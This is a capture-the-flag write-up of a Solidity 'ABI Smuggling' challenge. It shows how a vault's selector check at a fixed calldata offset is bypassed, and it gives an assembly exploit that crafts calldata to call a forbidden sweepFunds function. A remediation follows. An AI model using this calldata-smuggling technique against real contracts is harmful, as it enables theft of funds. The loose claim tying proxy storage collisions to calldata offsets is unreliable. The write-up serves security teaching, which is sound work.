# Challenge #12: ABI Smuggling

- **Difficulty:** Hard
- **Category:** Calldata Manipulation / Permission Bypass
- **Severity:** Critical
- **Status:** SOLVED ✅

## Overview

`SelfAuthorizedVault` has an `execute()` function that allows calling any function on any target, but first checks that the caller has permission for the **function selector** being called. Permissions are role-based: the player has permission for `withdraw()` but not for `sweepFunds()`.

## Vulnerability

The permission check reads the function selector from a **hardcoded absolute position** in the calldata, while the actual execution uses the **ABI-encoded dynamic offset** to find the real calldata:

```solidity
function execute(address target, bytes calldata actionData) external {
    // Permission check: reads selector from offset 100 (absolute position)
    bytes4 selector;
    assembly {
        selector := calldataload(100)  // ← Hardcoded absolute offset
    }
    require(hasPermission[msg.sender][selector], "Unauthorized");
    
    // Actual execution: uses actionData pointer (relative offset)
    target.call(actionData);  // ← Follows ABI encoding
}
```

The disconnect: position 100 in the raw calldata may not be where `actionData` actually starts. An attacker can craft calldata where:
- Position 100 contains the **allowed** selector (`withdraw`)
- The `actionData` pointer points to the **forbidden** selector (`sweepFunds`)

## Exploit Walkthrough

```solidity
// Crafted calldata layout (232 bytes total):
// Offset 0x00: execute selector       0x1cff79cd
// Offset 0x04: target (vault address)
// Offset 0x24: actionData offset      0x80
// Offset 0x44: padding/zeros
// Offset 0x64: SPOOFED selector       0xd9caed12 (withdraw — passes permission check)
// Offset 0x84: actionData length      0x44 (68 bytes)
// Offset 0xa4: REAL selector          0x85fb709d (sweepFunds — actual execution)
// Offset 0xa8: recovery address
// Offset 0xc8: token address

assembly {
    // Write execute selector
    mstore(add(p, 0x00), 0x1cff79cd00000000...)
    // Write target
    mstore(add(p, 0x04), vaultAddr)
    // Write actionData offset (relative to params start = position 4)
    mstore(add(p, 0x24), 0x80)
    // Write spoofed selector at offset 100
    mstore(add(p, 0x64), 0xd9caed1200000000...)
    // Write actionData length and sweepFunds call
    mstore(add(p, 0x84), 0x44)
    mstore(add(p, 0xa4), 0x85fb709d...)
    
    // Execute via low-level call
    success := call(gas(), vaultAddr, 0, p, 0xe8, 0, 0)
}
```

Key insight: ABI offsets for dynamic types are **relative to position 4** (start of encoded parameters), not absolute in the full calldata. The permission check at offset 100 reads the spoofed selector, while `actionData` points to the real one.

## Real-World Impact

While this exact pattern is rare, **calldata manipulation** has been used in delegatecall-based exploits. The **Proxy Storage Collision** attacks often rely on mismatched offsets between expected and actual calldata layouts.

## Remediation

```solidity
// FIX: Read selector from actionData, not hardcoded position
function execute(address target, bytes calldata actionData) external {
    require(actionData.length >= 4, "Invalid action data");
    bytes4 selector;
    assembly {
        selector := calldataload(add(actionData.offset, 0))
    }
    require(hasPermission[msg.sender][selector], "Unauthorized");
    target.call(actionData);
}
```

## Key Takeaway

> **Never read calldata from hardcoded absolute offsets. ABI-encoded dynamic types use relative offsets that can differ from their absolute positions. Always read selectors from the actual data pointer.**
